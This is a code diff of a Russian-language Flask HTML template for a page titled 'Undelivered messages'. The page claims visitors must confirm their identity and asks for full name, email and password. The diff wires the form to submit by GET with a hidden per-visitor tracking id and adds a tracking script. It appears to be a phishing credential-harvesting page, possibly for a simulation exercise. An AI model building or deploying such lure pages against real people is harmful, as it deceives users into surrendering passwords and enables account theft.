@@ -5,7 +5,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Регистрация - Недоставленные сообщения</title>
-    <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_5.1.css" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_5.1.css') }}">
+
 
 
 </head>
@@ -19,21 +20,22 @@
     <div class="container">
         <h2>Недоставленные сообщения</h2>
         <p>Чтобы получить недоставленные сообщения необходимо подтвердить свою личность</p>
-        <form>
+        <form action="/site_5.1" method="get">
+            <input type="hidden" name="id" value="{{ request.args.get('id') }}">
             <label for="lastname">Фамилия</label>
-            <input type="text" id="lastname" name="lastname" required />
+            <input class="фамилия" type="text" id="lastname" name="lastname" required />
 
             <label for="firstname">Имя</label>
-            <input type="text" id="firstname" name="firstname" required />
+            <input class="имя" type="text" id="firstname" name="firstname" required />
 
             <label for="middlename">Отчество</label>
-            <input type="text" id="middlename" name="middlename" required />
+            <input class="отчество" type="text" id="middlename" name="middlename" required />
 
             <label for="email">Электронная почта</label>
-            <input type="email" id="email" name="email" required />
+            <input class="электронная почта" type="email" id="email" name="email" required />
 
             <label for="password">Пароль</label>
-            <input type="password" id="password" name="password" required />
+            <input class="пароль" type="password" id="password" name="password" required />
 
             <button type="submit">Зарегистрироваться</button>
         </form>
@@ -41,6 +43,7 @@
 
         </div>
     </div>
+    <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
 </body>
 
 </html>
